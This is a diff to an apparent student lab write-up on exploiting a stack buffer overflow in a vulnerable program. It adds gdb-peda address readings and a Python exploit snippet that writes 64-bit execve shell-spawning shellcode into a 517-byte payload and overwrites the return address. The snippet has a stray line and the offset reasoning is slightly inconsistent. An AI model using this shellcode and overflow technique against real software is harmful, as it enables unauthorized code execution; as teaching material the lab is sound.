@@ -291,6 +291,7 @@ $1 = (void *) 0x7fffffffd990
 gdb-peda$ p &buffer
 $2 = (char (*)[10]) 0x7fffffffd986
 ```
+![attacks](/Lab7/exercise6/img/1.png)
 
 Due to the calculated buffer space being too small, it cannot accommodate the shellcode (which is 30 bytes in size). Therefore, the buffer in the bof function cannot be used here. Consequently, we redirect our attention to the `str` variable in the main function, which also stores the content of the shellcode. Therefore, we need to set the return address (`ret`) in the buffer to point to the shellcode within the `str` variable. It's important to note that breakpoints need to be reset because `str` is passed as a pointer to a pointer,
 
@@ -305,6 +306,7 @@ Breakpoint 1, main (argc=0x0, argv=0x0) at stack.c:26
 gdb-peda$ p &str
 $1 = (char (*)[517]) 0x7fffffffddc0
 ```
+![attacks](/Lab7/exercise6/img/2.png)
 
 Now we know that:
 - buffer = 0x7fffffffd986
@@ -312,6 +314,31 @@ Now we know that:
 - rbp = 0x7fffffffd990
 - offset = rbp - str + 8
 
-0x7fffffffd990 - 0x7fffffffd986
 
-The goal is to set the buffer's ret to the shellcode stored in str and then execute it. This is necessary because the calculated buffer space is too small to hold the shellcode. The buffer's size is only 10, while the shellcode's size is also 30. Therefore, it is not possible to use the buffer for this task. Instead, the shellcode must be executed from the main function's str. To achieve this, a new breakpoint must be set because str is passed as a pointer to a pointer. 
+We will utilize the `/Lab7/exercise6/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:
+
+```python
+shellcode= (
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+).encode('latin-1')
+
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)                 # 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value and put it somewhere in the payload
+str = 0x7fffffffddc0
+buffer = 0x7fffffffd986
+rbp = 0x7fffffffd990
+ret    = str+start           
+offset = rbp - buffer + 8              
+
+# In this example, we're assuming a 64-bit architecture.
+L = 8  
+s 
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+```
+
+![attacks](/Lab7/exercise6/img/3.png)
